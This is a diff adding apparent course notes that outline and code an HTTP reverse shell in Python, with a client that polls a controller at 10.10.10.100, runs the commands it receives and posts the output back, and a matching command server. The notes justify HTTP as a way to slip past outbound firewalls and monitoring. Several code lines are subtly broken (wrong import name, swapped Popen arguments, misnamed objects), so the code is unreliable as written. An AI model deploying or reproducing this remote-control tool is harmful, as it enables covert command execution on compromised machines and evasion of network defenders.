@@ -157,9 +157,62 @@ Setup file Syntax
   )
 
 8 - HTTP Reverse Shell Outline
+The reason for using HTTP is that the port is like to be open on the outbound firewall rules
+A lot of HTTP traffic is on every network which makes monitoring very difficult
+  - This makes the chance of attackers escaping high
+The example will use GET\POST methods
+Code is simpler than the previous examples
 
 9 - Coding a HTTP Reverse Shell Outline in 5 Lines
+Using a library called requests
+  http://docs.python-requests.org/en/master/
+Example Syntax
+Client
+  import requests
+  import subprocesses
+  import time
+  
+  while True:
+    req = requests.get("http://10.10.10.100")
+    command = req.text
+  
+  if 'terminate' in command:
+    break
+  else 
+    CMD = subprocess.Popen(shell, command=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+    post_response = requests.post(url='http://10.10.10.100', data=CMD.stdout.read())    # Posts the result
+    post_response = request.post(url='http://10.10.10.100', data=CMD.stderr.read())     # Posts any errors
+  time.sleep(3)
 
+Server
+  import BaseHTTPServer
+  HOST_NAME = "10.10.10.100"
+  PORT_NUMBER = 80
+  
+  class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):
+    def do_GET(s):
+      command = raw_input("Shell>")
+      s.send_response(200)
+      s.send_header("Content-type", "text/html")
+      s.end_headers()
+      s.wfile.write(command)          # Sends the command that we got from the users input
+    
+    def do_POST(s):
+      s.send_response(200)
+      s.end_headers()
+      length = int(s.headers['Content-Length'])
+      postVar = s.rfile.read(length)
+      print postVar
+
+  if __name__ == '__main__':
+    server_class = BaseHTTPServer.HTTPServer
+    httpd = server_class((HOST_NAME, PORT_NUMBER), MyHandler)       
+    try:
+      https.serve_forever()             # Starts the HTTP Server
+    except KeyboardInterrupt:
+      print '[!] Server is terminated'
+      httpd.server_close()
+  
 10 - Data Exfiltration
 
 11 - Exporting To EXE
